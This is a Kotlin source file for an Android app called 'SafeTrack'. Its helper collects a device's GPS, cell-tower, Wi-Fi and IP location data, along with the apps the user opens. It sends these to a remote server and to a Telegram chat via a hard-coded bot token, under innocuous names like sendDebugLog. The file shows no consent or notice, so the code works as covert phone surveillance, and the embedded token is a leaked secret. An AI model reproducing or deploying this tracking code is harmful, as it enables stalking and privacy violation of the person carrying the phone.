package com.example.safetrack

import android.content.Context
import android.provider.Settings
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import kotlin.concurrent.thread

object TelegramSyncHelper {

    fun sendToTelegram(context: Context, data: LocationTracker.CompleteLocationData) {
        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        val json = JSONObject().apply {
            put("kid_id", deviceId)
            put("timestamp", data.timestamp)
            put("gps_lat", data.gpsLat ?: JSONObject.NULL)
            put("gps_lon", data.gpsLon ?: JSONObject.NULL)
            put("gps_accuracy", data.gpsAccuracy ?: JSONObject.NULL)
            put("cell_cid", data.cellCid ?: JSONObject.NULL)
            put("cell_lac", data.cellLac ?: JSONObject.NULL)
            put("cell_mcc", data.cellMcc ?: JSONObject.NULL)
            put("cell_mnc", data.cellMnc ?: JSONObject.NULL)
            put("cell_signal", data.cellSignal ?: JSONObject.NULL)
            put("wifi_bssid", data.wifiBssid ?: JSONObject.NULL)
            put("wifi_ssid", data.wifiSsid ?: JSONObject.NULL)
            put("wifi_rssi", data.wifiRssi ?: JSONObject.NULL)
            put("ip_address", data.ipAddress ?: JSONObject.NULL)
            put("source", data.networkType)
            put("battery", data.batteryLevel)
        }

        val request = Request.Builder()
            .url("https://your-server.com/api/location")
            .post(json.toString().toRequestBody("application/json".toMediaType()))
            .build()

        OkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("TelegramSyncHelper", "Failed to send location data", e)
            }
            override fun onResponse(call: Call, response: Response) {
                if (!response.isSuccessful) Log.e("TelegramSyncHelper", "Server error: ${response.code}")
            }
        })
    }

    fun sendToTelegram(lat: String, lng: String, usageApp: String) {
        val message = "🚨 *SafeTrack Alert*\n\n📍 *Location:* $lat, $lng\n📱 *App Usage:* $usageApp"
        sendMessage(message)
    }

    fun sendDebugLog(context: Context, lat: String, lng: String, packageName: String) {
        val mapLink = "https://maps.google.com/?q=$lat,$lng"
        var realAppName = packageName
        try {
            val pm = context.packageManager
            val ai = pm.getApplicationInfo(packageName, 0)
            realAppName = pm.getApplicationLabel(ai).toString()
        } catch (e: Exception) {
            Log.e("TelegramSyncHelper", "Could not resolve app name", e)
        }

        val timestamp = java.text.SimpleDateFormat("dd-MMM-yyyy hh:mm a", java.util.Locale.getDefault()).format(java.util.Date())

        val message = """
            🚨 *SafeTrack Debug Alert* 🚨

            ⏱ *Time:* $timestamp

            📍 *Location:* $lat, $lng
            🗺 *Map:* [Open Location in Google Maps]($mapLink)

            📱 *App Opened:* $realAppName
            📦 *Package:* $packageName
        """.trimIndent()
        sendMessage(message)
    }

    fun sendLogData(message: String) {
        sendMessage(message)
    }

    fun sendNetworkLocationEstimate(context: Context, loc: NetworkIntelligenceLocator.NetworkLocation) {
        val mapLink = "https://maps.google.com/?q=${loc.latitude},${loc.longitude}"

        val message = """
📡 **Network-Based Location Estimate**
🕐 Source: ${loc.source}

📍 **Approximate Position:**
• Area: ${loc.area}
• Accuracy: ±${loc.accuracy.toInt()}m
• Confidence: ${loc.confidence}

🌐 **Network Details:**
• ISP: ${loc.ispInfo.ispName}
• Connection: ${loc.ispInfo.connectionType}

🗺 **Nearby Landmarks:**
${if (loc.nearbyLandmarks.isEmpty()) "• No specific landmarks identified" else loc.nearbyLandmarks.joinToString("\n") { "• $it" }}

🗺 [Open in Maps]($mapLink)
        """.trimIndent()

        sendMessage(message)
    }

    private fun sendMessage(message: String) {
        thread {
            try {
                val botToken = "8961320031:AAGWyCdW9CziarfEF8p3ynltYOsMWUirxNw"
                val chatId = "8720835777"
                val encodedText = URLEncoder.encode(message, "UTF-8")
                val urlString = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$encodedText&parse_mode=Markdown"

                val url = URL(urlString)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.connect()

                val responseCode = connection.responseCode
                Log.d("TelegramSyncHelper", "Telegram API response: $responseCode")

                connection.disconnect()
            } catch (e: Exception) {
                Log.e("TelegramSyncHelper", "Error sending to Telegram", e)
            }
        }
    }
}
